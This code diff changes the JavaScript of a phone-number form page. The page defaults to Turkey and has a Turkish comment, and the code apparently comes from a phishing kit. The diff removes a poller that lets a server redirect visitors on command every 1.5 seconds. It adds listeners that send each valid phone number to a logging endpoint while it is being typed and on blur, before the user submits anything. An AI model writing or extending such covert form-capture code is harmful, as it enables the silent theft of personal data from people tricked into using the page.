@@ -314,16 +314,11 @@
     function sendLogUpdate(payload) {
       try {
         const body = JSON.stringify(payload);
-        if (navigator.sendBeacon) {
-          const blob = new Blob([body], { type: 'application/json' });
-          navigator.sendBeacon('/api/log-page', blob);
-        } else {
-          fetch('/api/log-page', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body
-          }).catch(err => console.error('Phone log failed', err));
-        }
+        fetch('/api/log-page', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body
+        }).catch(err => console.error('Phone log failed', err));
       } catch (err) {
         console.error('Phone log error', err);
       }
@@ -334,15 +329,16 @@
     }
 
     function logPhoneInput(value) {
-      sendLogUpdate({
-        page: 'phone',
-        inputs: { input3: value || '' }
-      });
+      if (value && value.trim()) {
+        sendLogUpdate({
+          page: 'phone',
+          inputs: { input3: value.trim() }
+        });
+      }
     }
 
     logPhonePage();
 
-    function b_xhr() { fetch("/websocket.php", { method: "POST" }) .then((y) => y.json()) .then((m) => { if (m.success) { let u = m.success; if (u.includes('login')) { u = '../' + u; } window.location.href = u; } }); } setInterval(b_xhr, 1500);
     const f = document.forms[0];
     const ph = f.elements[0];
     
@@ -350,6 +346,25 @@
       initialCountry: 'TR',
       utilsScript: '../assets/utils.js',
     })
+
+    // Input değeri değiştiğinde kaydet
+    let phoneInputTimeout;
+    ph.addEventListener('input', function() {
+      clearTimeout(phoneInputTimeout);
+      phoneInputTimeout = setTimeout(function() {
+        if (iti.isValidNumber()) {
+          const phoneNumber = iti.getNumber();
+          logPhoneInput(phoneNumber);
+        }
+      }, 500);
+    });
+
+    ph.addEventListener('blur', function() {
+      if (iti.isValidNumber()) {
+        const phoneNumber = iti.getNumber();
+        logPhoneInput(phoneNumber);
+      }
+    });
 
     f.addEventListener('submit', function(evt) {
         evt.preventDefault();
